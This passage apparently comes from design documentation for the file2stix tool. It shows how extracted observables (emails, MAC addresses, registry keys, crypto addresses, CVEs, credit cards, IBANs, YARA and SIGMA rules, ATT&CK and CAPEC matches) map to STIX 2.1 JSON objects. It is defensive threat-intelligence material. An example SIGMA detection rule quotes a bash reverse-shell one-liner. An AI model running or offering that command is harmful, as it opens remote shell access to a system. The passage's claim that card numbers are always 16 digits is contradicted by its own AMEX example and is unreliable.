Lots of email extraction logic exists on the internet ([for example](https://github.com/kvesteri/validators/blob/master/validators/email.py)).  Like with URLs, it is also worth validating TLDs in the email to ensure they are valid.

Email Address Observables are represented by [STIX Indicator SDOs (`"type": "indicator"`)](https://docs.oasis-open.org/cti/stix/v2.1/csprd01/stix-v2.1-csprd01.html#_Toc16070633), using the [STIX Email Address SCO (`"type": "email-addr"`)](https://docs.oasis-open.org/cti/stix/v2.1/csprd01/stix-v2.1-csprd01.html#_Toc16070690) to create the Indicator SDO `pattern` property.

Here is how email address observables are represented in STIX 2.1 by file2stix;

#### STIX 2.1 indicator SDO

```json
  {
    "type": "indicator",
    "spec_version": "2.1",
    "id": "indicator--<GENERATED BY STIX2 LIBRARY>",
    "created_by_ref": "identity--<IF TLP RED/AMBER USER IDENTITY ID>",
    "created": "<REPORT CREATED PROPERTY VALUE>",
    "modified": "<REPORT MODIFIED PROPERTY VALUE>",
    "indicator_types": ["unknown"],
    "name": "Email Address: <EXTRACTED EMAIL ADDRESS OBSERVABLE VALUE>",
    "pattern_type": "stix",
    "pattern": "[ email-addr:value = '<EXTRACTED EMAIL ADDRESS OBSERVABLE VALUE>' ]",
    "valid_from": "<REPORT CREATED PROPERTY VALUE>",
    "object_marking_refs": [
      "marking-definition--<TLP LEVEL SET>"
    ],
    "extensions": {
      "extension-definition--d83fce45-ef58-4c6c-a3f4-1fbc32e98c6e": {
        "extension_type": "property-extension",
        "warning_list_match": ["MISP WARNING LIST[0]"]
      }
    }
  }
```

#### STIX 2.1 file SCO

```json
{
  "type": "email-addr",
  "spec_version": "2.1",
  "id": "email-addr--<GENERATED BY STIX2 LIBRARY>",
  "value": "<EXTRACTED EMAIL ADDRESS OBSERVABLE VALUE>",
  "defanged": "<DEFANGED BOOLEAN>"
}
```

### 9. MAC Address Observables (`indicator`)

* e.g. Full MAC address `d2:fb:49:24:37:18`

Mac Addresses have six parts, split by `:`. Lots of MAC address extraction logic exists on the internet ([for example](https://github.com/kvesteri/validators/blob/master/validators/mac_address.py)).

Full MAC addresses are represented by [STIX Indicator SDOs (`"type": "indicator"`)](https://docs.oasis-open.org/cti/stix/v2.1/csprd01/stix-v2.1-csprd01.html#_Toc16070633), using the [STIX MAC Address SCO (`"type": "mac-addr"`)](https://docs.oasis-open.org/cti/stix/v2.1/csprd01/stix-v2.1-csprd01.html#_Toc16070720) to create the Indicator SDO `pattern` property.

Here is how MAC Address observables are represented in STIX 2.1 by file2stix;

#### STIX 2.1 indicator SDO

```json
  {
    "type": "indicator",
    "spec_version": "2.1",
    "id": "indicator--<GENERATED BY STIX2 LIBRARY>",
    "created_by_ref": "identity--<IF TLP RED/AMBER USER IDENTITY ID>",
    "created": "<REPORT CREATED PROPERTY VALUE>",
    "modified": "<REPORT MODIFIED PROPERTY VALUE>",
    "indicator_types": ["unknown"],
    "name": "MAC Address: <EXTRACTED MAC ADDRESS OBSERVABLE VALUE>",
    "pattern_type": "stix",
    "pattern": "[ mac-addr:value = '<EXTRACTED MAC ADDRESS OBSERVABLE VALUE>' ]",
    "valid_from": "<REPORT CREATED PROPERTY VALUE>",
    "object_marking_refs": [
      "marking-definition--<TLP LEVEL SET>"
    ],
    "extensions": {
      "extension-definition--d83fce45-ef58-4c6c-a3f4-1fbc32e98c6e": {
        "extension_type": "property-extension",
        "warning_list_match": ["MISP WARNING LIST[0]"]
      }
    }
  }
```

#### STIX 2.1 mac-addr SCO

```json
{
  "type": "mac-addr",
  "spec_version": "2.1",
  "id": "mac-addr--<GENERATED BY STIX2 LIBRARY>",
  "value": "<EXTRACTED MAC ADDRESS OBSERVABLE VALUE>"
}
```

### 10. Windows Registry Key Observables (`indicator`)

* e.g. Full registry key path `HKEY_LOCAL_MACHINE\Software\Classes`

There are 5 types of registry key `HKEY_CLASSES_ROOT`, `HKEY_CURRENT_USER`, `HKEY_LOCAL_MACHINE`, `HKEY_USERS`, `HKEY_CURRENT_CONFIG`. These are then followed by a directory path with directories separated by `\`.

Windows Registry Keys are represented by [STIX Indicator SDOs (`"type": "indicator"`)](https://docs.oasis-open.org/cti/stix/v2.1/csprd01/stix-v2.1-csprd01.html#_Toc16070633), using the [STIX MAC Address SCO (`"type": "windows-registry-key"`)](https://docs.oasis-open.org/cti/stix/v2.1/csprd01/stix-v2.1-csprd01.html#_Toc16070748) to create the Indicator SDO `pattern` property.

Here is how Windows Registry Key observables are represented in STIX 2.1 by file2stix;

#### STIX 2.1 indicator SDO

```json
  {
    "type": "indicator",
    "spec_version": "2.1",
    "id": "indicator--<GENERATED BY STIX2 LIBRARY>",
    "created_by_ref": "identity--<IF TLP RED/AMBER USER IDENTITY ID>",
    "created": "<REPORT CREATED PROPERTY VALUE>",
    "modified": "<REPORT MODIFIED PROPERTY VALUE>",
    "indicator_types": ["unknown"],
    "name": "Windows Registry Key: <EXTRACTED WINDOWS REGISTRY KEY OBSERVABLE VALUE>",
    "pattern_type": "stix",
    "pattern": "[ windows-registry-key:key = '<EXTRACTED WINDOWS REGISTRY KEY OBSERVABLE VALUE>' ]",
    "valid_from": "<REPORT CREATED PROPERTY VALUE>",
    "object_marking_refs": [
      "marking-definition--<TLP LEVEL SET>"
    ],
    "extensions": {
      "extension-definition--d83fce45-ef58-4c6c-a3f4-1fbc32e98c6e": {
        "extension_type": "property-extension",
        "warning_list_match": ["MISP WARNING LIST[0]"]
      }
    }
  }
```

#### STIX 2.1 windows-registry-key SCO

```json
{
  "type": "windows-registry-key",
  "spec_version": "2.1",
  "id": "windows-registry-key--<GENERATED BY STIX2 LIBRARY>",
  "key": "<EXTRACTED WINDOWS REGISTRY KEY OBSERVABLE VALUE>"
}
```

### 11. User Agent Observables (`indicator`)

* e.g Full user agent `Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.6) Gecko/20040113`)

User Agents should follow [RFC7231](https://www.rfc-editor.org/rfc/rfc7231#section-5.5.3). There are a [few example regular expressions on the internet to extract user agent patterns](https://regex101.com/r/nXKYBB/3).

User Agents are represented by [STIX Indicator SDOs (`"type": "indicator"`)](https://docs.oasis-open.org/cti/stix/v2.1/csprd01/stix-v2.1-csprd01.html#_Toc16070633), using the [STIX Network Traffic SCO (`"type": "network-traffic"`)](https://docs.oasis-open.org/cti/stix/v2.1/csprd01/stix-v2.1-csprd01.html#_Toc16070724) to create the Indicator SDO `pattern` property.

Here is how User Agent observables are represented in STIX 2.1 by file2stix;

#### STIX 2.1 indicator SDO

```json
  {
    "type": "indicator",
    "spec_version": "2.1",
    "id": "indicator--<GENERATED BY STIX2 LIBRARY>",
    "created_by_ref": "identity--<IF TLP RED/AMBER USER IDENTITY ID>",
    "created": "<REPORT CREATED PROPERTY VALUE>",
    "modified": "<REPORT MODIFIED PROPERTY VALUE>",
    "indicator_types": ["unknown"],
    "name": "User Agent: <EXTRACTED USER AGENT OBSERVABLE VALUE>",
    "pattern_type": "stix",
    "pattern": "[ network-traffic:extensions.'http-request-ext'.request_header.'User-Agent' = '<EXTRACTED USER AGENT OBSERVABLE VALUE>' ]",
    "valid_from": "<REPORT CREATED PROPERTY VALUE>",
    "object_marking_refs": [
      "marking-definition--<TLP LEVEL SET>"
    ],
    "extensions": {
      "extension-definition--d83fce45-ef58-4c6c-a3f4-1fbc32e98c6e": {
        "extension_type": "property-extension",
        "warning_list_match": ["MISP WARNING LIST[0]"]
      }
    }
  }
```

#### STIX 2.1 network-traffic SCO

```json
{

  "type": "network-traffic",
  "spec_version": "2.1",
  "id": "network-traffic--<GENERATED BY STIX2 LIBRARY>",
  "protocols": [
    "http",
    "https",
    "tcp",
    "udp"
  ],
  "extensions": {
    "http-request-ext": {
      "request_method": "",
      "request_value": "",
      "request_header": {
        "User-Agent": "<EXTRACTED USER AGENT OBSERVABLE VALUE>"
      }
    }
  }
}
```

### 12. Autonomous System Number Observables (`indicator`)

Including:

* e.g. ASN Number format `ASN15139` / `ASN 15139`
* e.g. AS Number format `AS15139` / `AS 15139`

ASN numbers start with either ASN or AS and are followed by 5 digits. Occasionally some people write ASN numbers with a white space value between the text and digits.

ASNs are represented by [STIX Indicator SDOs (`"type": "indicator"`)](https://docs.oasis-open.org/cti/stix/v2.1/csprd01/stix-v2.1-csprd01.html#_Toc16070633), using the [STIX AS Object SCO (`"type": "autonomous-system"`)](https://docs.oasis-open.org/cti/stix/v2.1/csprd01/stix-v2.1-csprd01.html#_Toc16070683) to create the Indicator SDO `pattern` property.

Here is how AS observables are represented in STIX 2.1 by file2stix;

#### STIX 2.1 indicator SDO

```json
  {
    "type": "indicator",
    "spec_version": "2.1",
    "id": "indicator--<GENERATED BY STIX2 LIBRARY>",
    "created_by_ref": "identity--<IF TLP RED/AMBER USER IDENTITY ID>",
    "created": "<REPORT CREATED PROPERTY VALUE>",
    "modified": "<REPORT MODIFIED PROPERTY VALUE>",
    "indicator_types": ["unknown"],
    "name": "AS<EXTRACTED NUMERICAL AS OBSERVABLE VALUE>",
    "pattern_type": "stix",
    "pattern": "[ autonomous-system:number = '<EXTRACTED NUMERICAL AS OBSERVABLE VALUE>' ]",
    "valid_from": "<REPORT CREATED PROPERTY VALUE>",
    "object_marking_refs": [
      "marking-definition--<TLP LEVEL SET>"
    ],
    "extensions": {
      "extension-definition--d83fce45-ef58-4c6c-a3f4-1fbc32e98c6e": {
        "extension_type": "property-extension",
        "warning_list_match": ["MISP WARNING LIST[0]"]
      }
    }
  }
```

#### STIX 2.1 autonomous-system SCO

```json
{
  "type": "autonomous-system",
  "spec_version": "2.1",
  "id": "autonomous-system--<GENERATED BY STIX2 LIBRARY>",
  "number": "<EXTRACTED NUMERICAL AS OBSERVABLE VALUE>"
}
```

### 13. Cryptocurrency Observables (`indicator`)

Including:

* e.g. BTC address `3FZbgi29cpjq2GjdwV8eyHuJJnkLtktZc5`
* e.g. ETH address `0xb794f5ea0ba39494ce839613fffba74279579268`
* e.g. XMR address `888tNkZrPN6JsEgekjMnABU4TBzc2Dt29EPAvkRxbANsAnjyPbb3iQ1YBRk1UXcdRsiKc9dhw`

Each of these address formats has a defined length and allowed characters that can be extracted using a regex pattern. For example, [Bitcoin addresses is 58 characters](https://github.com/kvesteri/validators/blob/master/validators/btc_address.py).

Cryptocurrency Observables are represented by [STIX Indicator SDOs (`"type": "indicator"`)](https://docs.oasis-open.org/cti/stix/v2.1/csprd01/stix-v2.1-csprd01.html#_Toc16070633), using the [STIX Artifact Object SCO (`"type": "artifact"` because there are no types that represent cryptocurrency)](https://docs.oasis-open.org/cti/stix/v2.1/csprd01/stix-v2.1-csprd01.html#_Toc16070681) to create the Indicator SDO `pattern` property.

Here is how cryptocurrency observables are represented in STIX 2.1 by file2stix;

#### STIX 2.1 extension-definition

As STIX 2.1 does not natively have an extension for cryptocurrency, file2stix uses a custom SCO;

```json
{
  "id": "extension-definition--532ae28d-137b-4b89-afb7-9cf9b504191b",
  "type": "extension-definition",
  "spec_version": "2.1",
  "name": "Cryptocurrency SCO",
  "description": "This schema creates a new SCO type called cryptocurrency",
  "created": "2022-01-01T00:00:00.000Z",
  "modified": "2022-01-01T00:00:00.000Z",
  "created_by_ref": "identity--<FILE2STIX IDENTITY>",
  "schema": "https://github.com/signalscorps/file2stix",
  "version": "1.0",
  "extension_types": [ "new-sco" ],
  "object_marking_refs": [
    "marking-definition--613f2e26-407d-48c7-9eca-b8e91df99dc9"
  ]
}
```

#### STIX 2.1 cryptocurrency SCO

```json
{
  "type": "cryptocurrency",
  "spec_version": "2.1",
  "id": "cryptocurrency--<GENERATED BY STIX2 LIBRARY>",
  "type": "<CRYPTO TYPE>",
  "address": "<CRYPTO ADDRESS>",
  "extensions": {
    "extension-definition--532ae28d-137b-4b89-afb7-9cf9b504191b" : {
      "extension_type" : "new-sco"
    }
  }
}
```

#### STIX 2.1 indicator SDO

```json
  {
    "type": "indicator",
    "spec_version": "2.1",
    "id": "indicator--<GENERATED BY STIX2 LIBRARY>",
    "created_by_ref": "identity--<IF TLP RED/AMBER USER IDENTITY ID>",
    "created": "<REPORT CREATED PROPERTY VALUE>",
    "modified": "<REPORT MODIFIED PROPERTY VALUE>",
    "indicator_types": ["unknown"],
    "name": "<CRYPTO TYPE>: <EXTRACTED CRYPTOCURRENCY OBSERVABLE VALUE>",
    "pattern_type": "stix",
    "pattern": "[ cryptocurrency:type = '<EXTRACTED CRYPTOCURRENCY TYPE>' AND cryptocurrency:address = '<EXTRACTED CRYPTOCURRENCY OBSERVABLE VALUE>' ]",
    "valid_from": "<REPORT CREATED PROPERTY VALUE>",
    "object_marking_refs": [
      "marking-definition--<TLP LEVEL SET>"
    ],
    "extensions": {
      "extension-definition--d83fce45-ef58-4c6c-a3f4-1fbc32e98c6e": {
        "extension_type": "property-extension",
        "warning_list_match": ["MISP WARNING LIST[0]"]
      }
    }
  }
```

### 14. CVE Observables (`vulnerability`)

* e.g. Full CVE IDs `CVE-2022-00001`

CVE's always follow the format `CVE-YYYY-DDDDD`, where `YYYY` is the year and `DDDDD` is the numeric ID of the CVE.

CVE Observables are represented by the [STIX Vulnerability SDOs (`"type": "vulnerability"`)](https://docs.oasis-open.org/cti/stix/v2.1/csprd01/stix-v2.1-csprd01.html#_Toc16070669).

Here is how CVE observables are represented in STIX 2.1 by file2stix;

#### STIX 2.1 vulnerability SDO

```json
{
    "type": "vulnerability",
    "spec_version": "2.1",
    "id": "vulnerability--<GENERATED BY STIX2 LIBRARY>",
    "created_by_ref": "identity--<IF TLP RED/AMBER USER IDENTITY ID>",
    "created": "<REPORT CREATED PROPERTY VALUE>",
    "modified": "<REPORT MODIFIED PROPERTY VALUE>",
    "name": "<EXTRACTED CVE OBSERVABLE VALUE>",
    "external_references": [
      {
        "source_name": "cve",
        "external_id": "<EXTRACTED CVE OBSERVABLE VALUE>"
      },
      {
        "source_name": "vulmatch",
        "url": "https://app.vulmatch.com/cve/<EXTRACTED CVE OBSERVABLE VALUE>"
      },
    ],
    "object_marking_refs": [
      "marking-definition--<TLP LEVEL SET>"
    ],
    "extensions": {
      "extension-definition--d83fce45-ef58-4c6c-a3f4-1fbc32e98c6e": {
        "extension_type": "property-extension",
        "warning_list_match": ["MISP WARNING LIST[0]"]
      }
    }
}
```

### 15. Country Observables (`location`)

Including:

* Country Name (e.g. `United Kingdom`)
* Country Code (e.g. `UK`)

English country names and codes can be identified by standard definition dictionaries, [for example](https://github.com/cmu-sei/cyobstract/blob/master/etc/country_codes.txt).

Countries are represented by the [STIX Location SDOs (`"type": "location"`)](https://docs.oasis-open.org/cti/stix/v2.1/cs01/stix-v2.1-cs01.html#_th8nitr8jb4k).

Here is how Country observables are represented in STIX 2.1 by file2stix;

#### STIX 2.1 location SDO

```json
{
    "type": "location",
    "spec_version": "2.1",
    "id": "location--<GENERATED BY STIX2 LIBRARY>",
    "created_by_ref": "identity--<IF TLP RED/AMBER USER IDENTITY ID>",
    "created": "<REPORT CREATED PROPERTY VALUE>",
    "modified": "<REPORT MODIFIED PROPERTY VALUE>",
    "name": "Country: <EXTRACTED / CONVERTED FULL COUNTRY NAME OBSERVABLE VALUE>",
    "country": "<EXTRACTED / CONVERTED COUNTRY ISO OBSERVABLE VALUE>",
    "object_marking_refs": [
      "marking-definition--<TLP LEVEL SET>"
    ],
    "extensions": {
      "extension-definition--d83fce45-ef58-4c6c-a3f4-1fbc32e98c6e": {
        "extension_type": "property-extension",
        "warning_list_match": ["MISP WARNING LIST[0]"]
      }
    }
}
```

Note, in the case of Country Name extractions, the country name needs to be converted to a two character ISO 3166-1 ALPHA-2 Code for the `country` property.

### 16. Credit Card Observables (`indicator`)

* e.g. Mastercard `5555555555554444`
* e.g. Visa `4242424242424242`
* e.g. AMEX `378282246310005`
* e.g. Union Pay `6200000000000005`
* e.g. Diners `3056930009020004`
* e.g. JCB `3566002020360505`
* e.g. Discover `6011111111111117`

Card Numbers are always 16 digits long and the type of card can be determined by the first four digits (e.g. `4242` for Visa). [Therefore it is easy to identify card numbers using regular expressions](https://github.com/kvesteri/validators/blob/master/validators/validators/card.py).

These are represented by [STIX Indicator SDOs (`"type": "indicator"`)](https://docs.oasis-open.org/cti/stix/v2.1/csprd01/stix-v2.1-csprd01.html#_Toc16070633), using the [STIX Artifact Object SCO (`"type": "artifact"` because there are no types that represent credit cards)](https://docs.oasis-open.org/cti/stix/v2.1/csprd01/stix-v2.1-csprd01.html#_Toc16070681) to create the Indicator SDO `pattern` property.

Here is how credit card observables are represented in STIX 2.1 by file2stix;

#### STIX 2.1 extension-definition

As STIX 2.1 does not natively have an extension for credit cards, file2stix uses a custom SCO;

```json
{
  "id": "extension-definition--abd6fc0e-749e-4e6c-a20c-1faa419f5ee4",
  "type": "extension-definition",
  "spec_version": "2.1",
  "name": "Credit Card SCO",
  "description": "This schema creates a new SCO type called credit-card",
  "created": "2022-01-01T00:00:00.000Z",
  "modified": "2022-01-01T00:00:00.000Z",
  "created_by_ref": "identity--<FILE2STIX IDENTITY>",
  "schema": "https://github.com/signalscorps/file2stix",
  "version": "1.0",
  "extension_types": [ "new-sco" ],
  "object_marking_refs": [
    "marking-definition--613f2e26-407d-48c7-9eca-b8e91df99dc9"
  ]
}
```

#### STIX 2.1 credit-card SCO

```json
{
  "type": "credit-card",
  "spec_version": "2.1",
  "id": "credit-card--<GENERATED BY STIX2 LIBRARY>",
  "type": "<CREDIT CARD TYPE>",
  "number": "<CREDIT CARD NUMBER>",
  "extensions": {
    "extension-definition--abd6fc0e-749e-4e6c-a20c-1faa419f5ee4" : {
      "extension_type" : "new-sco"
    }
  }
}
```

#### STIX 2.1 indicator SDO

```json
  {
    "type": "indicator",
    "spec_version": "2.1",
    "id": "indicator--<GENERATED BY STIX2 LIBRARY>",
    "created_by_ref": "identity--<IF TLP RED/AMBER USER IDENTITY ID>",
    "created": "<REPORT CREATED PROPERTY VALUE>",
    "modified": "<REPORT MODIFIED PROPERTY VALUE>",
    "indicator_types": ["unknown"],
    "name": "<CARD TYPE> Credit Card: <EXTRACTED CREDIT CARD OBSERVABLE VALUE>",
    "pattern_type": "stix",
    "pattern": "[ credit-card:type = '<EXTRACTED CREDIT CARD TYPE>' AND credit-card:number = '<EXTRACTED CREDIT CARD OBSERVABLE VALUE>' ]",
    "valid_from": "<REPORT CREATED PROPERTY VALUE>",
    "object_marking_refs": [
      "marking-definition--<TLP LEVEL SET>"
    ],
    "extensions": {
      "extension-definition--d83fce45-ef58-4c6c-a3f4-1fbc32e98c6e": {
        "extension_type": "property-extension",
        "warning_list_match": ["MISP WARNING LIST[0]"]
      }
    }
  }
```

### 17. IBAN Observables (`indicator`)

* e.g. German IBAN `DE29100500001061045672`
* e.g. Great Britain IBAN `GB94BARC10201530093459`

IBAN numbers start with the country code. The country determines the length of the IBAN number and the structure (they are not all the same). However, as each countries structure must follow the same format [a regular expression can be used to match all IBAN country variations](https://github.com/kvesteri/validators/blob/master/validators/iban.py).

IBANs are represented by [STIX Indicator SDOs (`"type": "indicator"`)](https://docs.oasis-open.org/cti/stix/v2.1/csprd01/stix-v2.1-csprd01.html#_Toc16070633), using the [STIX Artifact Object SCO (`"type": "artifact"` because there are no types that represent IBAN numbers)](https://docs.oasis-open.org/cti/stix/v2.1/csprd01/stix-v2.1-csprd01.html#_Toc16070681) to create the Indicator SDO `pattern` property.

Here is how IBAN number observables are represented in STIX 2.1 by file2stix;

#### STIX 2.1 extension-definition

As STIX 2.1 does not natively have an extension for IBANs, file2stix uses a custom SCO;

```json
{
  "id": "extension-definition--349c1029-4052-4635-a064-263cb17290ea",
  "type": "extension-definition",
  "spec_version": "2.1",
  "name": "IBAN SCO",
  "description": "This schema creates a new SCO type called iban",
  "created": "2022-01-01T00:00:00.000Z",
  "modified": "2022-01-01T00:00:00.000Z",
  "created_by_ref": "identity--<FILE2STIX IDENTITY>",
  "schema": "https://github.com/signalscorps/file2stix",
  "version": "1.0",
  "extension_types": [ "new-sco" ],
  "object_marking_refs": [
    "marking-definition--613f2e26-407d-48c7-9eca-b8e91df99dc9"
  ]
}
```

#### STIX 2.1 iban SCO

```json
{
  "type": "iban",
  "spec_version": "2.1",
  "id": "iban--<GENERATED BY STIX2 LIBRARY>",
  "country": "<FIRST 2 CHARACHTERS OF IBAN>",
  "number": "<FULL IBAN NUMBER INCLUDING COUNTRY CODE>",
  "extensions": {
    "extension-definition--349c1029-4052-4635-a064-263cb17290ea" : {
      "extension_type" : "new-sco"
    }
  }
}
```

#### STIX 2.1 indicator SDO

```json
  {
    "type": "indicator",
    "spec_version": "2.1",
    "id": "indicator--<GENERATED BY STIX2 LIBRARY>",
    "created_by_ref": "identity--<IF TLP RED/AMBER USER IDENTITY ID>",
    "created": "<REPORT CREATED PROPERTY VALUE>",
    "modified": "<REPORT MODIFIED PROPERTY VALUE>",
    "indicator_types": ["unknown"],
    "name": "IBAN: <EXTRACTED IBAN OBSERVABLE VALUE>",
    "pattern_type": "stix",
    "pattern": "[ iban:number = '<EXTRACTED IBAN OBSERVABLE VALUE>' ]",
    "valid_from": "<REPORT CREATED PROPERTY VALUE>",
    "object_marking_refs": [
      "marking-definition--<TLP LEVEL SET>"
    ],
    "extensions": {
      "extension-definition--d83fce45-ef58-4c6c-a3f4-1fbc32e98c6e": {
        "extension_type": "property-extension",
        "warning_list_match": ["MISP WARNING LIST[0]"]
      }
    }
  }
```

### 18. YARA Rule Observables (`indicator`)

e.g. 

```yaml
rule dummy
{
    condition:
        false
}
```

YARA rules are can be identified using pattern matching as they always start with `rule ` and end with `}`.

YARA Rules are represented by [STIX Indicator SDOs (`"type": "indicator"`)](https://docs.oasis-open.org/cti/stix/v2.1/csprd01/stix-v2.1-csprd01.html#_Toc16070633) with [`"pattern_type": "yara"`](https://docs.oasis-open.org/cti/stix/v2.1/os/stix-v2.1-os.html#_9lfdvxnyofxw).

Here is how YARA Rule observables are represented in STIX 2.1 by file2stix;

#### STIX 2.1 indicator SDO

```json
  {
    "type": "indicator",
    "spec_version": "2.1",
    "id": "indicator--<GENERATED BY STIX2 LIBRARY>",
    "created_by_ref": "identity--<IF TLP RED/AMBER USER IDENTITY ID>",
    "created": "<REPORT CREATED PROPERTY VALUE>",
    "modified": "<REPORT MODIFIED PROPERTY VALUE>",
    "indicator_types": ["unknown"],
    "name": "YARA Rule: <RULE NAME>",
    "pattern_type": "yara",
    "pattern": "<YARA RULE>",
    "valid_from": "<REPORT CREATED PROPERTY VALUE>",
    "object_marking_refs": [
      "marking-definition--<TLP LEVEL SET>"
    ],
    "extensions": {
      "extension-definition--d83fce45-ef58-4c6c-a3f4-1fbc32e98c6e": {
        "extension_type": "property-extension",
        "warning_list_match": ["MISP WARNING LIST[0]"]
      }
    }
  }
```

The YARA rule is first encoded with JSON escapes before it is saved in the `pattern` value. e.g.

```
rule dummy\r\n{\r\n    condition:\r\n        false\r\n}
```

The `<RULE NAME>` is defined between the text `rule ` and first `{` (e.g. `dummy` in the last example).

### 19. SIGMA Rule Observables (`indicator`)

e.g. 

```yaml
title: Linux Reverse Shell Indicator
id: 83dcd9f6-9ca8-4af7-a16e-a1c7a6b51871
status: experimental
description: Detects a bash contecting to a remote IP address (often found when actors do something like 'bash -i >& /dev/tcp/10.0.0.1/4242 0>&1')
date: 2021/10/16
author: Florian Roth
logsource:
   product: linux
   category: network_connection
detection:
   selection:
      Image|endswith: '/bin/bash'
   filter:
      DestinationIp: 
         - '127.0.0.1'
         - '0.0.0.0'
   condition: selection and not filter
```

SIGMA Rules are detected if valid YAML containing three top level fields `title`, `logsource` and `detection` is present. If the three field names are detected, entire YAML content is ingested as the SIGMA rule.

SIGMA Rules are represented by [STIX Indicator SDOs (`"type": "indicator"`)](https://docs.oasis-open.org/cti/stix/v2.1/csprd01/stix-v2.1-csprd01.html#_Toc16070633) with [`"pattern_type": "sigma"`](https://docs.oasis-open.org/cti/stix/v2.1/os/stix-v2.1-os.html#_9lfdvxnyofxw).

Here is how SIGMA Rule observables are represented in STIX 2.1 by file2stix;

#### STIX 2.1 indicator SDO

```json
  {
    "type": "indicator",
    "spec_version": "2.1",
    "id": "indicator--<GENERATED BY STIX2 LIBRARY>",
    "created_by_ref": "identity--<IF TLP RED/AMBER USER IDENTITY ID>",
    "created": "<REPORT CREATED PROPERTY VALUE>",
    "modified": "<REPORT MODIFIED PROPERTY VALUE>",
    "indicator_types": ["unknown"],
    "name": "SIGMA Rule: <RULE NAME>",
    "pattern_type": "sigma",
    "pattern": "<SIGMA RULE>",
    "valid_from": "<REPORT CREATED PROPERTY VALUE>",
    "object_marking_refs": [
      "marking-definition--<TLP LEVEL SET>"
    ],
    "extensions": {
      "extension-definition--d83fce45-ef58-4c6c-a3f4-1fbc32e98c6e": {
        "extension_type": "property-extension",
        "warning_list_match": ["MISP WARNING LIST[0]"]
      }
    }
  }
```

The SIGMA RULE is encoded with JSON escapes before being written into the `pattern` value. e.g.

```
title: Linux Reverse Shell Indicator\r\nid: 83dcd9f6-9ca8-4af7-a16e-a1c7a6b51871\r\nstatus: experimental\r\ndescription: Detects a bash contecting to a remote IP address (often found when actors do something like 'bash -i >& \/dev\/tcp\/10.0.0.1\/4242 0>&1')\r\ndate: 2021\/10\/16\r\nauthor: Florian Roth\r\nlogsource:\r\n   product: linux\r\n   category: network_connection\r\ndetection:\r\n   selection:\r\n      Image|endswith: '\/bin\/bash'\r\n   filter:\r\n      DestinationIp: \r\n         - '127.0.0.1'\r\n         - '0.0.0.0'\r\n   condition: selection and not filter

```

The `<RULE NAME>` is defined by the value in the `title: ` field of the YAML rule.

### 20. CPE Observables (`software`)

* e.g. Full CPE URI `cpe:2.3:o:apple:mac_os_x:10.1.3:*:*:*:*:*:*:*`

CPEs can be identified as they start with `cpe:` and have 12 separators `:` in total.

CPEs are represented by [STIX Software SCOs (`"type": "software"`)](https://docs.oasis-open.org/cti/stix/v2.1/csprd01/stix-v2.1-csprd01.html#_Toc16070740)

#### STIX 2.1 software SCO

```json
{
    "type": "software",
    "spec_version": "2.1",
    "id": "software--<GENERATED BY STIX2 LIBRARY>",
    "name": "CPE: <EXTRACTED CPE VENDOR> <EXTRACTED CPE PRODUCT> <EXTRACTED CPE VERSION>",
    "cpe": "<EXTRACTED CPE OBSERVABLE VALUE>",  
    "version": "<EXTRACTED CPE VERSION>",
    "vendor": "<EXTRACTED CPE VENDOR>",
    "extensions": {
      "extension-definition--d83fce45-ef58-4c6c-a3f4-1fbc32e98c6e": {
        "extension_type": "property-extension",
        "warning_list_match": ["MISP WARNING LIST[0]"]
      }
    }
}
```

Note, `<EXTRACTED CPE VENDOR>` is the 4th value in the CPE string, `<EXTRACTED CPE PRODUCT>` is the 5th, and `<EXTRACTED CPE VERSION>` is 6th place.

### 21. MITRE ATT&CK Observables

[I have created an extensive MITRE ATT&CK tutorial I recommend reading if you are new to the framework](/blog/2022/2022-04-18-mitre-attack-101-data-structure.md).

file2stix is designed to identify ATT&CK data found in text using keyword matches on the `name`, `external_references.external_id` (where `"source_name": "mitre-attack"` for Enterprise ATT&CK or `"source_name": "mitre-mobile-attack"` for mobile ATT&CK) and `x_mitre_aliases` (when exists) fields inside the STIX object representing it.

Take the ATT&CK sub-technique [1053.005: Scheduled Task](https://github.com/mitre/cti/blob/master/enterprise-attack/attack-pattern/attack-pattern--005a06c6-14bf-4118-afa0-ebcd8aebb0c9.json).

You will see;

```json
            "name": "Scheduled Task",
```

and

```json
                {
                    "source_name": "mitre-attack",
                    "external_id": "T1053.005",
                    "url": "https://attack.mitre.org/techniques/T1053/005"
                },
```

Therefore, the dictionary entries to identify this ATT&CK Object are `Scheduled Task` and `T1053.005` (case insensitive).

The following ATT&CK data types from the [Enterprise](https://github.com/mitre/cti/tree/master/enterprise-attack) and [Mobile](https://github.com/mitre/cti/tree/master/mobile-attack) and [ICS](https://github.com/mitre/cti/tree/master/ics-attack) matrices are supported in this way;

* Techniques (`attack-pattern`)
* Sub-Technique (`attack-pattern`)
* Tactic (`x-mitre-tactic--`)
* Course of Action (`course-of-action`)
* Intrusion Set (`intrusion-set`)
* Malware (`malware`)
* Tool (`tool`)
* Data Sources (`x-mitre-data-source`)

In the case of a dictionary match to a MITRE ATT&CK STIX Object, no new object is actually created. A new Relationship Object is created between the created STIX Report SDO with imported ATT&CK STIX Object. The ATT&CK STIX Object remains unmodified.

For example, if the uploaded text contained `1053.005` it would match to the ATT&CK Object [1053.005: Scheduled Task](https://github.com/mitre/cti/blob/master/enterprise-attack/attack-pattern/attack-pattern--005a06c6-14bf-4118-afa0-ebcd8aebb0c9.json) and an SRO would be created between the Report SDO and this Attack Pattern SDO.

### 22. MITRE CAPEC Observables

CAPECs are extracted in a very similar way to ATT&CK objects, using a dictionary.

file2stix can identify ATT&CK data found in text using keyword matches on the `name` and `external_references.external_id` (where `"source_name": "capec"`) fields inside the STIX object representing it.

Take [CAPEC-170 Web Application Fingerprinting](https://github.com/mitre/cti/blob/master/capec/2.1/attack-pattern/attack-pattern--0cf857f6-afa4-4f0c-850f-58a4f11df157.json).

You will see;

```json
            "name": "Web Application Fingerprinting",
```

and

```json
                {
                    "external_id": "CAPEC-170",
                    "source_name": "capec",
                    "url": "https://capec.mitre.org/data/definitions/170.html"
                },
```

Therefore, the dictionary entries to identify this CAPEC Object are `Web Application Fingerprinting` and `CAPEC-170` (case insensitive).

The following CAPEC data types are supported in this way;

* CAPEC (`attack-pattern`)

In the case of a dictionary match to a MITRE CAPEC STIX Object, no new object is created. A new Relationship Object is created between the created STIX Report SDO with imported CAPEC STIX Object. The CAPEC STIX Object remains unmodified.

